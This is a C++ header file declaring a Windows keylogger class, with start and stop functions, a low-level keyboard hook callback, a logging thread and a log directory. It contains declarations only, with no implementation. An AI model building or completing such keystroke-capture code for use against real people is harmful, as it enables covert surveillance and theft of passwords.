#pragma once
#ifndef KEYLOGGER_H
#define KEYLOGGER_H
#include <string>
#include <windows.h>


using namespace std;
class KL
{
public:
	static bool isLogging;
	static char szDir[260];
	static bool StartK();
	static bool StopK();
private:
	static int isCapsLock();
	static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
	static DWORD WINAPI KeyLogger(LPVOID lpParameter);
};


#endif